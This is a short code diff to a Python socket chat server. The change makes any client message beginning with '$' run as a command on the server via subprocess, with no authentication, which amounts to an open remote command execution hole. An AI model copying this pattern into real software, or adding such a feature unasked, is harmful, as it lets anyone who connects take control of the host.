@@ -3,6 +3,7 @@ import threading
 from Cryptodome.PublicKey import RSA
 from Cryptodome import Random
 from Cryptodome.Cipher import PKCS1_OAEP
+import subprocess
 
 ALLOW = 2048
 PORT = 6666
@@ -32,8 +33,18 @@ def each_client(data , addr):
               connection = False
               print(f"{addr} has been disconnected")
               data.send("You Have Been Disconnected From The Server".encode(FORMAT))
+          elif msg[0]=='$':
+              msg= msg[1:len(msg)]
+              try :
+                a = subprocess.run(msg.split())
+                if a.returncode==0:
+                    data.send("Command Success".encode(FORMAT))
+                else: data.send("Command Error".encode(FORMAT))
+              except FileNotFoundError:
+                  data.send("Command Error".encode(FORMAT))
+          else:
 
-          print(f'{addr} {msg}')
+              print(f'{addr} {msg}')
     data.close()
 
 
